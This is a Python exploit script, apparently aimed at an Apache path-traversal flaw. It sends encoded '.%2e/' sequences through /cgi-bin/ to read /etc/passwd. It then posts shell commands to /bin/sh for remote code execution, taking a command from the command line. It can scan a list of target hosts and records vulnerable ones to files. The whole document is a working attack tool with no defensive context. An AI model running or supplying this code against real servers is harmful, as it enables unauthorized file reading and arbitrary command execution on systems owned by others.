#!/usr/bin/env python3

import requests, re, subprocess, os, argparse, sys, urllib.request, socket

def exploit_rce(args, target):

    url = (target if re.match("https?://",target) else f"http://{target}")+"/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh\n"

    if args.cmd != "False":
        data = "A=|echo;"+args.cmd
        req = urllib.request.Request(url, data=bytes(data, 'utf-8'))
    else:
        req = urllib.request.Request(url, data=b'A=|echo;pwd')
   
    try: 
        response = urllib.request.urlopen(req, timeout=5)
        
        if response.status == 200:
            content = response.read().decode('utf-8')
            
            print("(+) Server {} is \033[1;32mvulnerable with RCE\033[1;37m" .format(target))
            f=open("success_rce.txt", "a+")
            f.write("{}\n" .format(target))
            f.close()

            if args.cmd != "False":
                data = "A=|echo;"+args.cmd
                req = urllib.request.Request(url, data=bytes(data, 'utf-8'))
                print(content)
            else:
                req = urllib.request.Request(url, data=b'A=|echo;pwd')

        else:
            print("(+)\033[1;31m Server {} is not vulnerable\033[1;37m" .format(target))
    
    except urllib.error.URLError as e:
        print("(+) Server {} is \033[1;31mnot vulnerable\033[1;37m" .format(target))
    
    except socket.timeout:
        print("(+) Server {} is \033[1;31mnot response\033[1;37m" .format(target))
    
    except ConnectionResetError:
        print("(+) Server {} \033[1;31mconnection reset\033[1;37m" .format(target))

def exploit(args, target):

    url = (target if re.match("https?://",target) else f"http://{target}")
    req = urllib.request.Request(url)

    try:
        response = urllib.request.urlopen(req, timeout=5)

        url = (target if re.match("https?://",target) else f"http://{target}")+"/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd\n"
        req = urllib.request.Request(url)
       
        try: 
            response = urllib.request.urlopen(req, timeout=5)
            if response.status == 200:
                content = response.read().decode('utf-8')
                
                if 'root:' in content:            
                    print("(+) Server {} is \033[1;32mvulnerable\033[1;37m" .format(target))
                    f=open("success.txt", "a+")
                    f.write("{}\n" .format(target))
                    f.close()

            else:
                print("(+)\033[1;31m Server {} is not vulnerable\033[1;37m" .format(target))
        
        except urllib.error.URLError as e:
            #print("(+) Server {} is \033[1;31mnot vulnerable\033[1;37m" .format(target))
            exploit_rce(args, target)
        
        except socket.timeout:
            print("(+) Server {} is \033[1;31mnot response\033[1;37m" .format(target))
        
        except ConnectionResetError:
            print("(+) Server {} \033[1;31mconnection reset\033[1;37m" .format(target))

    except:
        print("(+) Server {} is \033[1;31mnot reachable\033[1;37m" .format(target))

def readfile(args):

    with open(args.file, "r") as file:
        Lines = file.readlines()
        count = 0

        for line in Lines:
            count += 1
            exploit(args, line.strip())

def main(args):

    if args.target != "False":
        exploit(args, args.target)

    elif args.file != "False":
        readfile(args)

if __name__ == "__main__":
    
    ## parse argument
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", action="store", help="Target url", default="False")
    parser.add_argument("-f", "--file", action="store", help="List of target url", default="False")
    parser.add_argument("-c", "--cmd", action="store", help="RCE command", default="False")
    args = parser.parse_args()

    if len(sys.argv[1:])==0:
        parser.print_help()
        parser.exit()

    try:
        main(args)

    except KeyboardInterrupt:
        print('\n\033[1;31m[!] Abort\033[1;37m')
